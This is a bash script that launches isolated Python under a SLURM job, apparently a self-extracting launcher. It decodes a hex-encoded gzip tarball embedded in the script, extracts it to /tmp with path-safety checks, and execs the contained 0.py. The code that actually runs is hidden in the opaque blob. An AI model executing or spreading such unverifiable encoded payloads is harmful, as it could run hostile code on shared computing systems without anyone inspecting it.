#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8f9b301086f7ccafb07201a4c831df24ab1c7befa1eda55aad061882b30920dbe96e5af5bfd7866895b6526fbbdbaaf31c30c69e77ec198f117caf87fee64511965c88a915bfb72249b2e7f7f97b5e14e28689975dd6cc491b50d6e56bf8fa0bf9b630c303f68b0d5b5422c2ba2c206fe375b558b2c508e7c300cdbdee20ce7237254d73489338117955625e62d54212c771298a28ced690476ddbc4588b061a48b04e13c8f3b482248d6bc85281d7aad5d9a0b6a259bc2e445eba9103f457ceea3c4ab2341228ca621de5629dd90128abb48e0b0488d7a22db3b448d2b66c5384a48832d15857a2acb110eb76f1fdad83fb0f20f8787e711f7faeff288ad25feb3f4d13aaffd7401ec74119a6cf7ae97e04cb0e747790d5d206a59507f45a351cd908c67d6497c9ef6dd7535bd704d69083da7df91cdd85b7f5d6697057de3a08d4ca17d3dfc50fb9425bf1069f4c10861ecca6fe6a54c31e6bb3aa87e3f1d44b735eedf7673cf53b3f5cd59ffde966f2ef9c8cd97df53dd01aadfbcb12f97c5304308b4fd78955e71d3e357287dabada6eadcacfb7987fe73d4ad3b1cbfef830621f40c84033b3f1583b28864cf65387c996f58361c87b38227707c568671df883aa3b50cd7d1789951f6eeaa137b23fe1b58dd4ce4110322be973ee3bd569dfb35cc84727b7512035b24f7038e13ba50615f81f7b0dad5bc478327e6825c7ad0de5e8af66c3dbd159626ff8f1a1912a983b7afb419d70894f529bfbe161ea8576eaa392062fc131dc2640416da685e19c159710974497632e7b17e1402cb551c1e4d48e4e47e06ac37c3f3c1f8523c8de738f4085de5b9f6582200882200882200882200882200882200882200882f85ff9010b8c66e600280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
